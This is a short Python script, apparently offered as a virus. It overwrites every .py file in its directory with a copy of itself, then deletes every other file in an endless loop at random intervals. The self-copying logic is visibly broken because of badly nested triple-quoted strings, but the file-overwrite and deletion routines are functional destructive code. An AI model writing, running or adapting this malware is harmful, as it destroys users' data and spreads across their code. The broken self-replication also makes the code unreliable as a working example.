import os
import time
import random

def create_virus(filename):
    with open(filename, "w") as f:
        f.write("""
import os
import time
import random

def create_virus(filename):
    with open(filename, "w") as f:
        f.write(""" + repr(create_virus.__doc__) + """)

def spread_virus():
    files = os.listdir()
    for file in files:
        if file.endswith(".py"):
            create_virus(file)

def destroy_files():
    files = os.listdir()
    for file in files:
        if file != "virus.py":
            os.remove(file)

if __name__ == "__main__":
    create_virus("virus.py")
    spread_virus()
    while True:
        destroy_files()
        time.sleep(random.randint(60, 3600))
""")

def spread_virus():
    files = os.listdir()
    for file in files:
        if file.endswith(".py"):
            create_virus(file)

def destroy_files():
    files = os.listdir()
    for file in files:
        if file != "virus.py":
            os.remove(file)

if __name__ == "__main__":
    create_virus("virus.py")
    spread_virus()
    while True:
        destroy_files()
        time.sleep(random.randint(60, 3600))